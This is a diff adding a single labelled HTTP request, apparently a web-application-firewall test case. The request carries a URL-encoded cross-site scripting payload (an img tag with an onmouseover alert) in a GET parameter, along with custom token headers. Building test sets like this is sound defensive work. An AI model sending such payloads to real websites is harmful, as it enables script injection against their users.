@@ -1,0 +1,9 @@
+# XSS跨站脚本_GET_常规_事件-06506822
+# 攻击载荷利用<img>标签和onmouseover事件来执行alert()函数，弹出一个警告框。当鼠标悬停时触发。
+GET /?id=%3CIMG%20SRC=%23%20onmouseover=%22alert%28%27xxs%27%29%22%3E&bid=hd_tag_m8mv250f HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv250f
+RM-PRO-Token: 19954445e22e3c7da99c078037b4a829
+RM-PRO-Time: 1742808428088
+User-Agent: curl/7.83.1
+
